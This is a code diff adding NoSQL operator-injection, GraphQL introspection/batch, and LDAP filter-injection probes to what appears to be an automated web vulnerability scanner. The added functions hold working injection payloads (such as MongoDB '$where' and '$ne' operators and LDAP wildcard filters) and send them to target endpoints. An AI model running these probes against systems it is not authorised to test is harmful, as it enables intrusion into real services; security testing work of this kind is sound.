@@ -2918,6 +4794,48 @@ async def test_sqli_with_waf_bypass(pool, endpoint, params, waf_detected=False):
 # ============================================================
 # Stage 9: NoSQL / MongoDB / GraphQL / LDAP / XXE-OOB
 # ============================================================
+
+async def test_nosql_advanced(pool, endpoint, params=None):
+    """Advanced NoSQL injection: MongoDB operators + blind."""
+    from urllib.parse import quote
+    if params is None:
+        params = ["id", "user", "username", "email", "q", "search"]
+    findings = []
+    OPERATORS = [
+        ("[$ne]", "1", "not_equal"),
+        ("[$gt]", "", "greater_than"),
+        ("[$regex]", ".*", "regex_all"),
+        ("[$where]", "1==1", "where_clause"),
+        ("[$exists]", "true", "exists"),
+    ]
+    for param in params:
+        for op, val, subtype in OPERATORS:
+            try:
+                test_url = endpoint + "?" + param + op + "=" + quote(val, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp or resp.status == 0:
+                continue
+            body_low = (resp.text or "").lower()
+            indicators = ["mongo", "bson", "unknown operator", "unrecognized",
+                          "cannot apply", "err_client", "cast to objectid"]
+            if any(ind in body_low for ind in indicators):
+                findings.append({
+                    "vuln_class": "nosql",
+                    "subtype": "operator_injection_" + subtype,
+                    "severity": "high",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param + op,
+                    "payload": op + "=" + val,
+                    "evidence": (resp.text or "")[:300],
+                    "confidence": 0.8,
+                })
+                log.info("nosql_advanced_found", param=param, op=op)
+                break
+    log.info("nosql_advanced_complete", findings=len(findings))
+    return findings
 
 async def test_nosql(pool, endpoints, params=None):
     if params is None:
@@ -2991,6 +4909,55 @@ async def test_mongodb_exposure(pool, base_url):
     return findings
 
 
+async def test_graphql_advanced(pool, target):
+    """Advanced GraphQL: introspection + batch + injection."""
+    findings = []
+    GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query", "/v1/graphql"]
+    for path in GRAPHQL_PATHS:
+        url = target.rstrip("/") + path
+        introspection = '{"query":"{__schema{types{name}}}"}'
+        try:
+            resp = await pool.send("POST", url, content=introspection,
+                headers={"Content-Type": "application/json"})
+        except Exception:
+            continue
+        if not resp or resp.status == 0:
+            continue
+        body = resp.text or ""
+        if "__schema" in body and "types" in body:
+            findings.append({
+                "vuln_class": "graphql",
+                "subtype": "introspection_enabled",
+                "severity": "medium",
+                "url": url,
+                "injected_url": url,
+                "param": "query",
+                "payload": introspection,
+                "evidence": "GraphQL introspection enabled",
+                "confidence": 0.95,
+            })
+            log.info("graphql_introspection_found", url=url)
+        batch = '[{"query":"{__typename}"},{"query":"{__typename}"},{"query":"{__typename}"}]'
+        try:
+            batch_resp = await pool.send("POST", url, content=batch,
+                headers={"Content-Type": "application/json"})
+            if batch_resp and batch_resp.status == 200 and batch_resp.text.count("__typename") >= 3:
+                findings.append({
+                    "vuln_class": "graphql",
+                    "subtype": "batch_queries_enabled",
+                    "severity": "low",
+                    "url": url,
+                    "injected_url": url,
+                    "param": "batch",
+                    "payload": batch,
+                    "evidence": "GraphQL batch queries enabled",
+                    "confidence": 0.7,
+                })
+        except Exception:
+            pass
+    log.info("graphql_advanced_complete", findings=len(findings))
+    return findings
+
 async def test_graphql(pool, endpoints):
     findings = []
     graphql_paths = ["/graphql", "/api/graphql", "/gql", "/query"]
@@ -3020,6 +4987,70 @@ async def test_graphql(pool, endpoints):
                 continue
     return findings
 
+
+async def test_ldap_advanced(pool, endpoint, params=None):
+    """Advanced LDAP injection (error-based + blind)."""
+    from urllib.parse import quote
+    if params is None:
+        params = ["user", "username", "cn", "uid", "login", "email"]
+    findings = []
+    PAYLOADS = [
+        ("*)(uid=*))(|(uid=*", "classic_wildcard"),
+        ("*)(objectClass=*", "objectclass_wildcard"),
+        ("admin*", "admin_wildcard"),
+        ("*))%00", "null_byte"),
+    ]
+    for param in params:
+        try:
+            base_resp = await pool.send("GET", endpoint + "?" + param + "=test")
+        except Exception:
+            continue
+        if not base_resp or base_resp.status == 0:
+            continue
+        base_len = len(base_resp.text or "")
+        base_status = base_resp.status
+        for payload, subtype in PAYLOADS:
+            try:
+                test_url = endpoint + "?" + param + "=" + quote(payload, safe="")
+                resp = await pool.send("GET", test_url)
+            except Exception:
+                continue
+            if not resp:
+                continue
+            body_low = (resp.text or "").lower()
+            ldap_errors = ["ldap_", "ldaperror", "invalid dn", "javax.naming", "protocol error"]
+            if any(e in body_low for e in ldap_errors):
+                findings.append({
+                    "vuln_class": "ldap",
+                    "subtype": "error_based_" + subtype,
+                    "severity": "high",
+                    "url": test_url,
+                    "injected_url": test_url,
+                    "param": param,
+                    "payload": payload,
+                    "evidence": (resp.text or "")[:300],
+                    "confidence": 0.85,
+                })
+                log.info("ldap_error_found", param=param)
+                break
+            resp_len = len(resp.text or "")
+            if base_len > 0 and abs(resp_len - base_len) > max(50, base_len * 0.3):
+                if resp.status != base_status or resp_len > base_len * 1.5:
+                    findings.append({
+                        "vuln_class": "ldap",
+                        "subtype": "blind_" + subtype,
+                        "severity": "medium",
+                        "url": test_url,
+                        "injected_url": test_url,
+                        "param": param,
+                        "payload": payload,
+                        "evidence": "Baseline=" + str(base_len) + ", injection=" + str(resp_len),
+                        "confidence": 0.65,
+                    })
+                    log.info("ldap_blind_found", param=param)
+                    break
+    log.info("ldap_advanced_complete", findings=len(findings))
+    return findings
 
 async def test_ldap(pool, endpoints, params=None):
     if params is None:
